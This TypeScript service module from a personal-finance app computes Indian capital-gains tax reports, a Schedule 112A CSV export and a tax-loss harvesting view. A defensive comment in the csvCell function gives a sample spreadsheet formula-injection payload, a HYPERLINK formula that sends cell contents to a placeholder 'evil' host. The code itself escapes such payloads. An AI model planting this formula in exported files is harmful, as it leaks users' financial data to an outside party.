import { Decimal } from 'decimal.js';
import type { AssetClass, TransactionType } from '@prisma/client';
import { prisma } from '../lib/prisma.js';
import { investmentIncome } from './investmentIncome.service.js';
import { logger } from '../lib/logger.js';
import {
  computeOpenLots,
  computeUserCapitalGains,
  isCapitalAssetClass,
  financialYearOf,
  loadFundCategoryMap,
  lotTaxStatus,
  type CapitalGainRow,
} from './capitalGains.service.js';
import { buildSchedule43Report } from './reports/schedule43.report.js';
import { computeHarvestSavings } from './taxHarvestMath.js';
import { getFmvForUser } from './fmvOverride.service.js';
import {
  SLAB_RATE_ESTIMATE_PCT,
  capitalGainsRulesFor,
  listedEquityLtcgExemptionFor,
} from '@everypaisa/shared';
import { computeCapitalGainsTax, slabRateForUser } from './taxComputation.js';

/**
 * Tax module — user-level (cross-portfolio) tax reporting.
 *
 * Sits on top of capitalGains.service (per-asset FIFO engine) + foPnl.service
 * (F&O business income) and produces ITR-aligned consolidated reports
 * comparable to mProfit / i-Record:
 *   - Tax summary (FY-level with estimated liability per section)
 *   - Schedule 112A scrip-wise CSV (ITR-portal compatible)
 *   - Schedule 112 (non-equity LTCG with indexation)
 *   - STCG / LTCG / Intraday / F&O reports
 *   - Dividend + Interest income consolidation
 *   - Tax-loss harvesting view (unrealised losses available to offset)
 */

// ─── Tax rates ──────────────────────────────────────────────────────
//
// Rates, the 112A exemption and the dates they change on come from the shared
// rules table (`@everypaisa/shared` capitalGainsTaxRules); the slab rate is the
// user's own when on file. Totals are computed row by row by transfer date in
// taxComputation.ts — the helpers below only describe the rates in force at a
// point in time, for display and forward-looking estimates.

interface TaxRates {
  // §111A: STCG on listed equity / equity MF / ETF (STT paid)
  stcgEquityPct: number;
  // §112A: LTCG on listed equity / equity MF / ETF over exemption
  ltcgEquityPct: number;
  ltcgEquityExemption: Decimal;
  // §112: LTCG on other assets — with and without indexation
  ltcgOtherIndexedPct: number;
  ltcgOtherNonIndexedPct: number;
  // Slab (non-equity STCG, intraday speculation, F&O)
  slabPct: number;
}

export function ratesForDate(d: Date, slabPct: number = SLAB_RATE_ESTIMATE_PCT): TaxRates {
  const rates = capitalGainsRulesFor(d).ratesPct;
  return {
    stcgEquityPct: rates.stcgListedEquity,
    ltcgEquityPct: rates.ltcgListedEquity,
    ltcgEquityExemption: new Decimal(listedEquityLtcgExemptionFor(financialYearOf(d))),
    ltcgOtherIndexedPct: rates.ltcgIndexed,
    ltcgOtherNonIndexedPct: rates.ltcgWithoutIndexation,
    slabPct,
  };
}

/** Rates in force for an FY as of today, or at its last day once it has ended. */
function ratesForFy(fy: string, slabPct?: number): TaxRates {
  const startYear = Number.parseInt(fy.slice(0, 4), 10);
  const fyEnd = new Date(Date.UTC(startYear + 1, 2, 31));
  const today = new Date();
  return ratesForDate(today < fyEnd ? today : fyEnd, slabPct);
}

// ─── Helpers ────────────────────────────────────────────────────────

function pct(amount: Decimal, percentage: number): Decimal {
  return amount.times(percentage).dividedBy(100);
}

async function userCgRows(userId: string, fy?: string): Promise<CapitalGainRow[]> {
  const { rows } = await computeUserCapitalGains(userId);
  return fy ? rows.filter((r) => r.financialYear === fy) : rows;
}

function fyOptionsFromRows(rows: CapitalGainRow[]): string[] {
  const set = new Set<string>();
  for (const r of rows) set.add(r.financialYear);
  return Array.from(set).sort().reverse();
}

/**
 * Returns FYs (descending) where the user has any taxable activity:
 * realised capital gains, dividend/interest income, F&O trades, or
 * maturity proceeds. Used by the Tax page to default the FY selector
 * to the latest FY with data instead of the calendar-current FY.
 */
export async function availableTaxFys(userId: string): Promise<string[]> {
  const [cgRows, txs] = await Promise.all([
    computeUserCapitalGains(userId).then((r) => r.rows),
    prisma.transaction.findMany({
      where: { portfolio: { userId } },
      select: { tradeDate: true },
    }),
  ]);
  const set = new Set<string>();
  for (const r of cgRows) set.add(r.financialYear);
  for (const t of txs) set.add(financialYearOf(t.tradeDate));
  return Array.from(set).sort().reverse();
}

// ─── User-scoped cross-portfolio CG reports ─────────────────────────

export async function userStcgReport(userId: string, fy?: string) {
  const rows = (await userCgRows(userId, fy)).filter((r) => r.capitalGainType === 'SHORT_TERM');
  const totalGain = rows.reduce((a, r) => a.plus(r.gainLoss), new Decimal(0));
  const taxable = rows.reduce((a, r) => a.plus(r.taxableGain), new Decimal(0));
  const rowsNeedingReview = rows.filter((r) => r.needsReview).length;
  return { rows: rows.map(rowToJson), totalGain: totalGain.toString(), taxable: taxable.toString(), count: rows.length, rowsNeedingReview };
}

export async function userLtcgReport(userId: string, fy?: string) {
  const rows = (await userCgRows(userId, fy)).filter((r) => r.capitalGainType === 'LONG_TERM');
  const totalGain = rows.reduce((a, r) => a.plus(r.gainLoss), new Decimal(0));
  const taxable = rows.reduce((a, r) => a.plus(r.taxableGain), new Decimal(0));
  const rowsNeedingReview = rows.filter((r) => r.needsReview).length;
  return { rows: rows.map(rowToJson), totalGain: totalGain.toString(), taxable: taxable.toString(), count: rows.length, rowsNeedingReview };
}

export async function userIntradayReport(userId: string, fy?: string) {
  const rows = (await userCgRows(userId, fy)).filter((r) => r.capitalGainType === 'INTRADAY');
  const totalGain = rows.reduce((a, r) => a.plus(r.gainLoss), new Decimal(0));
  return {
    rows: rows.map(rowToJson),
    totalGain: totalGain.toString(),
    count: rows.length,
    rowsNeedingReview: rows.filter((r) => r.needsReview).length,
  };
}

/**
 * Per-FY tax on a subset of rows (one schedule), summed across the FYs the rows
 * fall in — each FY gets its own exemption and its rows' transfer-date rates.
 */
function scheduleTotals(rows: CapitalGainRow[]) {
  const fys = [...new Set(rows.map((r) => r.financialYear))];
  return fys.map((fy) => computeCapitalGainsTax(rows, fy));
}

/**
 * Schedule 112A — LTCG on listed equity / equity MF / ETF. Gains are the
 * grandfathered taxable gains; the exemption is the one for each FY.
 */
export async function userSchedule112AReport(userId: string, fy?: string) {
  const all = await userCgRows(userId, fy);
  const rows = all.filter(
    (r) => r.capitalGainType === 'LONG_TERM' && r.isEquityOriented,
  );
  const perFy = scheduleTotals(rows);
  const sum = (pick: (t: (typeof perFy)[number]) => Decimal) =>
    perFy.reduce((s, t) => s.plus(pick(t)), new Decimal(0));
  const totalGain = sum((t) => t.s112A.gain);
  const taxable = sum((t) => t.s112A.taxable);
  const estimatedTax = sum((t) => t.s112A.tax);
  const exemption = sum((t) => new Decimal(listedEquityLtcgExemptionFor(t.financialYear)));
  return {
    rows: rows.map(rowToJson),
    totalGain: totalGain.toString(),
    exemptionLimit: exemption.toString(),
    taxable: taxable.toString(),
    // Effective rate: FYs that straddle a rate change mix two rates.
    ratePct: taxable.isZero() ? ratesForFy(fy ?? financialYearOf(new Date())).ltcgEquityPct : estimatedTax.dividedBy(taxable).times(100).toDecimalPlaces(2).toNumber(),
    estimatedTax: estimatedTax.toString(),
    count: rows.length,
    rowsNeedingReview: rows.filter((r) => r.needsReview).length,
  };
}

/**
 * Schedule 112 — LTCG on non-equity assets (debt MF, bonds, gold, real estate,
 * foreign equity, etc.). Shows indexed cost + tax estimate.
 */
export async function userSchedule112Report(userId: string, fy?: string) {
  const all = await userCgRows(userId, fy);
  const rows = all.filter(
    (r) => r.capitalGainType === 'LONG_TERM' && !r.isEquityOriented,
  );
  const totalGain = rows.reduce((a, r) => a.plus(r.gainLoss), new Decimal(0));
  const totalTaxable = rows.reduce((a, r) => a.plus(r.taxableGain), new Decimal(0));
  // Rates by each row's transfer date, losses netted within the FY.
  const estimatedTax = scheduleTotals(rows).reduce((s, t) => s.plus(t.s112.tax), new Decimal(0));
  return {
    rows: rows.map(rowToJson),
    totalGain: totalGain.toString(),
    taxable: totalTaxable.toString(),
    estimatedTax: estimatedTax.toString(),
    count: rows.length,
    rowsNeedingReview: rows.filter((r) => r.needsReview).length,
  };
}

// ─── Income (dividends + interest) consolidated across portfolios ───

export async function userIncomeReport(userId: string, fy?: string, portfolioIds?: string[]) {
  return investmentIncome({ userId, ...(portfolioIds?.length ? { id: { in: portfolioIds } } : {}) }, fy);
}

// ─── Tax summary — consolidated FY view with estimated tax ──────────

export interface TaxSummary {
  financialYear: string;
  rates: {
    stcgEquityPct: number;
    ltcgEquityPct: number;
    ltcgEquityExemption: string;
    ltcgOtherIndexedPct: number;
    ltcgOtherNonIndexedPct: number;
    slabPct: number;
  };
  capitalGains: {
    section111A_stcgEquity: { gain: string; taxable: string; tax: string };
    section112A_ltcgEquity: { gain: string; exemption: string; taxable: string; tax: string };
    section112_ltcgOther: { gain: string; taxable: string; tax: string };
    stcgOther: { gain: string; taxable: string; tax: string };
    intradaySpeculative: { gain: string; taxable: string; tax: string };
    virtualDigitalAssets: { gain: string; taxable: string; tax: string };
  };
  /** Losses left after this FY's set-off, available to carry forward. */
  carryForward: { shortTermLoss: string; longTermLoss: string; speculativeLoss: string };
  /** True when slab-rate figures use the stand-in rate because the user's slab isn't on file. */
  slabIsEstimate: boolean;
  fnoBusinessIncome: { netPnl: string; turnover: string; tax: string; auditApplicable: boolean };
  otherIncome: { dividend: string; interest: string; maturity: string };
  totalRealisedGain: string;
  totalEstimatedTax: string;
  availableFys: string[];
}

export async function buildTaxSummary(
  userId: string,
  fy: string,
  portfolioIds?: string[],
): Promise<TaxSummary> {
  const [{ rows: allRows }, slab] = await Promise.all([computeUserCapitalGains(userId), slabRateForUser(userId)]);
  // Optional portfolio scope (empty = every portfolio).
  const rows = portfolioIds?.length ? allRows.filter((r) => portfolioIds.includes(r.portfolioId)) : allRows;
  const rates = ratesForFy(fy, slab.slabPct);
  // Section totals, set-off, the FY's 112A exemption and transfer-date rates.
  const cg = computeCapitalGainsTax(rows, fy, slab);

  const s111AGain = cg.s111A.gain;
  const s111ATax = cg.s111A.tax;
  const s112AGain = cg.s112A.gain;
  const s112ATaxable = cg.s112A.taxable;
  const s112ATax = cg.s112A.tax;
  const s112Gain = cg.s112.rawGain;
  const s112Taxable = cg.s112.taxable;
  const s112Tax = cg.s112.tax;
  const stcgOtherGain = cg.stcgOther.gain;
  const stcgOtherTax = cg.stcgOther.tax;
  const intradayGain = cg.intraday.gain;
  const intradayTax = cg.intraday.tax;

  // F&O — non-speculative business income (slab rate)
  let fnoNet = new Decimal(0);
  let fnoTurnover = new Decimal(0);
  let fnoAudit = false;
  try {
    const reports = portfolioIds?.length
      ? await Promise.all(portfolioIds.map((pid) => buildSchedule43Report(userId, fy, pid)))
      : [await buildSchedule43Report(userId, fy)];
    for (const s43 of reports) {
      fnoNet = fnoNet.plus(s43.nonSpeculative.netPnl);
      fnoTurnover = fnoTurnover.plus(s43.nonSpeculative.turnover);
      fnoAudit = fnoAudit || s43.taxAuditApplicable;
    }
  } catch (err) {
    logger.warn({ userId, fy, err }, 'tax.summary: F&O schedule-43 failed; treating as zero');
  }
  const fnoTax = pct(Decimal.max(fnoNet, new Decimal(0)), rates.slabPct);

  // Other income (informational; taxed at slab outside this estimate)
  const income = await userIncomeReport(userId, fy, portfolioIds);

  const totalRealisedGain = s111AGain
    .plus(s112AGain)
    .plus(s112Gain)
    .plus(stcgOtherGain)
    .plus(intradayGain)
    .plus(cg.vda.gain)
    .plus(fnoNet);

  const totalEstimatedTax = cg.totalTax.plus(fnoTax);

  return {
    financialYear: fy,
    rates: {
      stcgEquityPct: rates.stcgEquityPct,
      ltcgEquityPct: rates.ltcgEquityPct,
      ltcgEquityExemption: String(listedEquityLtcgExemptionFor(fy)),
      ltcgOtherIndexedPct: rates.ltcgOtherIndexedPct,
      ltcgOtherNonIndexedPct: rates.ltcgOtherNonIndexedPct,
      slabPct: rates.slabPct,
    },
    capitalGains: {
      section111A_stcgEquity: { gain: s111AGain.toString(), taxable: cg.s111A.taxable.toString(), tax: s111ATax.toString() },
      section112A_ltcgEquity: {
        gain: s112AGain.toString(),
        exemption: cg.s112A.exemption.toString(),
        taxable: s112ATaxable.toString(),
        tax: s112ATax.toString(),
      },
      section112_ltcgOther: {
        gain: s112Gain.toString(),
        taxable: s112Taxable.toString(),
        tax: s112Tax.toString(),
      },
      stcgOther: { gain: stcgOtherGain.toString(), taxable: cg.stcgOther.taxable.toString(), tax: stcgOtherTax.toString() },
      intradaySpeculative: { gain: intradayGain.toString(), taxable: cg.intraday.taxable.toString(), tax: intradayTax.toString() },
      virtualDigitalAssets: { gain: cg.vda.gain.toString(), taxable: cg.vda.taxable.toString(), tax: cg.vda.tax.toString() },
    },
    carryForward: {
      shortTermLoss: cg.carryForward.shortTermLoss.toString(),
      longTermLoss: cg.carryForward.longTermLoss.toString(),
      speculativeLoss: cg.carryForward.speculativeLoss.toString(),
    },
    slabIsEstimate: slab.isEstimate,
    fnoBusinessIncome: {
      netPnl: fnoNet.toString(),
      turnover: fnoTurnover.toString(),
      tax: fnoTax.toString(),
      auditApplicable: fnoAudit,
    },
    otherIncome: {
      dividend: income.dividend,
      interest: income.interest,
      maturity: income.maturity,
    },
    totalRealisedGain: totalRealisedGain.toString(),
    totalEstimatedTax: totalEstimatedTax.toString(),
    availableFys: fyOptionsFromRows(rows),
  };
}

// ─── Schedule 112A scrip-wise CSV (ITR-portal format) ───────────────

/**
 * Generates ITR-portal-compatible scrip-wise CSV for Schedule 112A.
 * Column order matches the income-tax e-filing portal's bulk upload
 * template (FY 2023-24 onwards):
 *   Share/Unit acquired, ISIN, Name, No. of shares, Sale Price per share,
 *   Full value of consideration, Cost of acquisition without indexation,
 *   Cost per share (col 6/4), If acquired before 1-Feb-2018 (Y/N),
 *   FMV per share as on 31-Jan-2018, Sale price (col 5),
 *   Lower of col 9 & 10 (per share), Higher of col 7 & 11,
 *   Acquisition cost u/s 55(2)(ac) (col 12 × col 4),
 *   Expenditure wholly & exclusively in connection with transfer,
 *   Total deductions, Balance (col 6 – col 14).
 *
 * FMV for grandfathering (col 9) is populated from FmvOverride/SystemFmvSeed
 * (fmvOverride.service.ts) for rows acquired before 01-Feb-2018 where an ISIN
 * match exists; left blank only when no FMV is known (user hasn't overridden
 * and the seed doesn't cover that ISIN) — matches GrandfatheringRow.needsUserInput
 * in fmvOverride.service.ts#listGrandfatheringRows.
 *
 * Cost-of-acquisition cascade (Sec 55(2)(ac)): cost used = higher of (actual
 * cost, lower of (FMV, sale price)). Col 11 = lower of Col 9 (FMV) and Col 10
 * (sale price); Col 12 = higher of Col 7 (actual cost per unit) and Col 11.
 * The order matters — taking "higher of cost/FMV" before capping at sale
 * price loses the actual-cost floor whenever cost > sale price, understating
 * losses on capital-loss rows. When FMV is unknown, Col 11/Col 12 are left
 * blank and Col 13 falls back to the uncorrected actual cost per unit (no
 * grandfathering applied).
 */
export async function schedule112ACsv(userId: string, fy: string): Promise<string> {
  const all = await userCgRows(userId, fy);
  const rows = all.filter(
    (r) => r.capitalGainType === 'LONG_TERM' && r.isEquityOriented,
  );
  const grandfatherCutoff = new Date('2018-02-01T00:00:00Z');
  const fmvByIsin = await getFmvForUser(userId);

  const headers = [
    'ISIN',
    'Name of Share/Unit',
    'No. of Shares/Units',
    'Sale Price per Share/Unit',
    'Full Value of Consideration',
    'Cost of Acquisition Without Indexation',
    'Cost per Share/Unit',
    'Acquired Before 01/02/2018',
    'FMV per Share/Unit as on 31/01/2018',
    'Sale Price (Col 5)',
    'Lower of Col 9 and Col 10',
    'Higher of Col 7 and Col 11',
    'Acquisition Cost u/s 55(2)(ac)',
    'Expenditure on Transfer',
    'Total Deductions',
    'Balance (Col 6 - Col 14)',
    // Extra column, not part of the ITR-portal template — lets a CA see at a
    // glance which FMV values are seeded, user-overridden, or still missing.
    'FMV Source',
    // Extra columns, not part of the ITR-portal template — flag rows where
    // either (a) a MUTUAL_FUND's equity/debt category could not be resolved
    // and tax treatment defaulted to debt-conservative, or (b) indexation
    // was applicable but the CII table had no entry for the FY, so the gain
    // shown is a non-indexed (possibly overstated) fallback.
    'Review Needed',
    'Review Reason',
  ];

  const lines: string[] = [headers.map(csvCell).join(',')];

  for (const r of rows) {
    const qty = r.quantity;
    const salePricePerUnit = r.sellPrice;
    const fullConsideration = r.sellAmount;
    const costNoIndex = r.buyAmount;
    const costPerUnit = qty.isZero() ? new Decimal(0) : costNoIndex.dividedBy(qty);
    const acquiredBeforeCutoff = r.buyDate < grandfatherCutoff ? 'Y' : 'N';
    // FMV only applies to pre-cutoff lots with a known ISIN match; blank
    // otherwise (needsUserInput-equivalent — see fmvOverride.service.ts).
    const fmvRecord =
      acquiredBeforeCutoff === 'Y' && r.isin ? fmvByIsin.get(r.isin) ?? null : null;
    const fmvPerUnitDecimal = fmvRecord?.fmvPerUnit ?? null;
    const fmvPerUnit = fmvPerUnitDecimal ? fmvPerUnitDecimal.toFixed(4) : '';
    // Not applicable (post-cutoff buy) → blank; eligible but unresolved
    // (no ISIN, or ISIN not in FmvOverride/SystemFmvSeed) → MISSING.
    const fmvSource = acquiredBeforeCutoff !== 'Y' ? '' : (fmvRecord?.source ?? 'MISSING');
    // Col 11 = lower of FMV (col 9) and sale price (col 10); blank when FMV
    // is unknown — there is nothing to cap against.
    const col11 = fmvPerUnitDecimal ? Decimal.min(fmvPerUnitDecimal, salePricePerUnit) : null;
    // Col 12 = higher of cost-per-share (col 7) and col 11. Falls back to the
    // uncorrected cost-per-share when FMV is unknown (no grandfathering).
    const col12 = col11 ? Decimal.max(costPerUnit, col11) : costPerUnit;
    // Col 13 = col 12 × qty
    const col13 = col12.times(qty);
    // Expenditure on transfer (col 14) — not tracked at row level; default 0
    const col14 = new Decimal(0);
    const totalDeductions = col13.plus(col14);
    const balance = fullConsideration.minus(totalDeductions);

    lines.push(
      [
        r.isin ?? '',
        r.assetName,
        qty.toFixed(4),
        salePricePerUnit.toFixed(4),
        fullConsideration.toFixed(2),
        costNoIndex.toFixed(2),
        costPerUnit.toFixed(4),
        acquiredBeforeCutoff,
        fmvPerUnit,
        salePricePerUnit.toFixed(4),
        col11 ? col11.toFixed(4) : '',
        col12.toFixed(4),
        col13.toFixed(2),
        col14.toFixed(2),
        totalDeductions.toFixed(2),
        balance.toFixed(2),
        fmvSource,
        r.needsReview ? 'Y' : 'N',
        r.reviewReason ?? '',
      ]
        .map(csvCell)
        .join(','),
    );
  }
  return lines.join('\n');
}

function csvCell(v: string): string {
  if (v == null) return '';
  let s = String(v);
  // Neutralise spreadsheet formula injection. Excel and LibreOffice treat a
  // cell beginning with = + - @ (or a leading tab/CR) as a formula and
  // evaluate it on open. Free-text columns here — assetName, reviewReason —
  // come from parsed broker and CAS documents, i.e. from outside. A crafted
  // instrument name like =HYPERLINK("http://evil/?"&A1,"x") would run when
  // the user opens their own Schedule 112A export.
  //
  // A leading apostrophe is the conventional fix: spreadsheets treat the rest
  // as literal text and do not display it.
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

/**
 * Test seam for `csvCell`, which stays module-private. Exported under an
 * explicit name so the CSV-injection regression test asserts the real
 * function rather than a copy of its logic.
 */
export const schedule112ACsvCellForTest = csvCell;

// ─── Tax-loss harvesting view ───────────────────────────────────────

export interface TaxHarvestRow {
  portfolioId: string;
  assetClass: AssetClass;
  assetName: string;
  isin: string | null;
  quantity: string;
  avgCostPrice: string;
  currentPrice: string | null;
  totalCost: string;
  currentValue: string;
  unrealisedPnL: string;
  pctReturn: string;
  longTermEligible: boolean; // every lot still held would be long-term if sold today
  equityOriented: boolean; // sec 111A/112A asset
  oldestBuyDate: string;     // ISO date string of the oldest BUY for this holding
  classification: 'STCG_LOSS' | 'LTCG_LOSS' | 'STCG_GAIN' | 'LTCG_GAIN';
}

/**
 * Tax-loss harvesting candidates — unrealised losses available to offset
 * realised gains in the current FY. Includes all holdings (not just losses)
 * so the user can also see unrealised gains close to LTCG threshold.
 */
export async function taxHarvestReport(userId: string, fy?: string, portfolioIds?: string[]) {
  const portfolioScope = portfolioIds?.length ? { id: { in: portfolioIds } } : {};
  const holdings = await prisma.holdingProjection.findMany({
    where: { portfolio: { userId, ...portfolioScope } },
    include: { portfolio: { select: { name: true } } },
  });

  // Remaining FIFO lots per holding — a holding can mix long- and short-term
  // lots, and a fully sold-then-rebought position starts a new holding period.
  const txs = await prisma.transaction.findMany({
    where: { portfolio: { userId, ...portfolioScope } },
    orderBy: { tradeDate: 'asc' },
  });
  const fundCategoryMap = await loadFundCategoryMap(txs);
  const openByAsset = new Map(
    computeOpenLots(txs, fundCategoryMap).map((p) => [`${p.portfolioId}|${p.assetKey}`, p]),
  );

  const now = new Date();
  const out: Array<TaxHarvestRow & { portfolioName: string }> = [];
  let totalUnrealisedLoss = new Decimal(0);
  let stcgLossAvailable = new Decimal(0);
  let ltcgLossAvailable = new Decimal(0);

  for (const h of holdings) {
    // Deposits, PF, insurance etc. produce no capital loss to harvest.
    if (!isCapitalAssetClass(h.assetClass)) continue;
    // A holding with no transaction history (e.g. a holdings-only import) is
    // one lot of unknown date: shown, and counted as short-term.
    const position = openByAsset.get(`${h.portfolioId}|${h.assetKey}`) ?? {
      portfolioId: h.portfolioId,
      assetKey: h.assetKey,
      assetClass: h.assetClass,
      fundId: h.fundId,
      lots: [{ buyDate: now, quantity: new Decimal(h.quantity.toString()), costPerUnit: new Decimal(h.avgCostPrice.toString()) }],
    };
    const cost = new Decimal(h.totalCost.toString());
    const value = h.currentValue ? new Decimal(h.currentValue.toString()) : cost;
    const pnl = value.minus(cost);
    const pctReturn = cost.isZero() ? '0' : pnl.dividedBy(cost).times(100).toFixed(2);

    // Split the unrealised result by lot term at today's price.
    const heldQty = position.lots.reduce((s, l) => s.plus(l.quantity), new Decimal(0));
    const pricePerUnit = heldQty.isZero() ? new Decimal(0) : value.dividedBy(heldQty);
    let stPnl = new Decimal(0);
    let ltPnl = new Decimal(0);
    let allLongTerm = true;
    for (const lot of position.lots) {
      const lotPnl = pricePerUnit.minus(lot.costPerUnit).times(lot.quantity);
      if (lotTaxStatus(position, lot.buyDate, now, fundCategoryMap).longTerm) ltPnl = ltPnl.plus(lotPnl);
      else {
        stPnl = stPnl.plus(lotPnl);
        allLongTerm = false;
      }
    }
    const oldest = position.lots.reduce((d, l) => (l.buyDate < d ? l.buyDate : d), position.lots[0]!.buyDate);
    const dominantLongTerm = ltPnl.abs().greaterThan(stPnl.abs());
    let classification: TaxHarvestRow['classification'];
    if (pnl.isNegative()) classification = dominantLongTerm ? 'LTCG_LOSS' : 'STCG_LOSS';
    else classification = dominantLongTerm ? 'LTCG_GAIN' : 'STCG_GAIN';

    if (stPnl.isNegative()) stcgLossAvailable = stcgLossAvailable.plus(stPnl.abs());
    if (ltPnl.isNegative()) ltcgLossAvailable = ltcgLossAvailable.plus(ltPnl.abs());
    if (pnl.isNegative()) totalUnrealisedLoss = totalUnrealisedLoss.plus(pnl.abs());
    const ltEligible = allLongTerm;
    const equityOriented = lotTaxStatus(position, now, now, fundCategoryMap).equityOriented;

    out.push({
      portfolioId: h.portfolioId,
      portfolioName: h.portfolio?.name ?? '',
      assetClass: h.assetClass,
      assetName: h.assetName ?? '',
      isin: h.isin,
      quantity: h.quantity.toString(),
      avgCostPrice: h.avgCostPrice.toString(),
      currentPrice: h.currentPrice?.toString() ?? null,
      totalCost: cost.toString(),
      currentValue: value.toString(),
      unrealisedPnL: pnl.toString(),
      pctReturn,
      longTermEligible: ltEligible,
      equityOriented,
      oldestBuyDate: oldest.toISOString().slice(0, 10),
      classification,
    });
  }

  // Realised gains in FY available to offset against
  let realisedStcg = new Decimal(0);
  let realisedLtcg = new Decimal(0);
  if (fy) {
    const cgRows = (await userCgRows(userId, fy)).filter(
      (r) => !portfolioIds?.length || portfolioIds.includes(r.portfolioId),
    );
    for (const r of cgRows) {
      if (r.capitalGainType === 'SHORT_TERM') realisedStcg = realisedStcg.plus(r.taxableGain);
      else if (r.capitalGainType === 'LONG_TERM') realisedLtcg = realisedLtcg.plus(r.taxableGain);
    }
  }

  // Sort: biggest unrealised losses first
  out.sort((a, b) => new Decimal(a.unrealisedPnL).comparedTo(b.unrealisedPnL));

  // Optimiser: how much tax the harvestable losses could offset against the
  // gains already realised this FY (informational — see taxHarvestMath). A
  // harvest sale happens now, so today's rates apply; the exemption is the FY's.
  const rates = fy ? ratesForFy(fy) : ratesForDate(now);
  const savings = computeHarvestSavings({
    realisedStcg,
    realisedLtcg,
    stcgLossAvailable,
    ltcgLossAvailable,
    stcgRate: rates.stcgEquityPct / 100,
    ltcgRate: rates.ltcgEquityPct / 100,
    ltcgExemption: rates.ltcgEquityExemption,
  });

  return {
    rows: out,
    totals: {
      unrealisedLoss: totalUnrealisedLoss.toString(),
      stcgLossAvailable: stcgLossAvailable.toString(),
      ltcgLossAvailable: ltcgLossAvailable.toString(),
      realisedStcgInFy: realisedStcg.toString(),
      realisedLtcgInFy: realisedLtcg.toString(),
    },
    savings: {
      ...savings,
      stcgRatePct: rates.stcgEquityPct,
      ltcgRatePct: rates.ltcgEquityPct,
      ltcgExemption: rates.ltcgEquityExemption.toString(),
    },
    count: out.length,
  };
}

// ─── Internal: serialize CG row for JSON ────────────────────────────

function rowToJson(r: CapitalGainRow) {
  return {
    portfolioId: r.portfolioId,
    sellTransactionId: r.sellTransactionId,
    buyTransactionId: r.buyTransactionId,
    assetClass: r.assetClass,
    assetName: r.assetName,
    isin: r.isin,
    buyDate: r.buyDate,
    sellDate: r.sellDate,
    quantity: r.quantity.toString(),
    buyPrice: r.buyPrice.toString(),
    sellPrice: r.sellPrice.toString(),
    buyAmount: r.buyAmount.toString(),
    sellAmount: r.sellAmount.toString(),
    indexedCostOfAcquisition: r.indexedCostOfAcquisition?.toString() ?? null,
    capitalGainType: r.capitalGainType,
    gainLoss: r.gainLoss.toString(),
    taxableGain: r.taxableGain.toString(),
    financialYear: r.financialYear,
    needsReview: r.needsReview,
    reviewReason: r.reviewReason,
  };
}
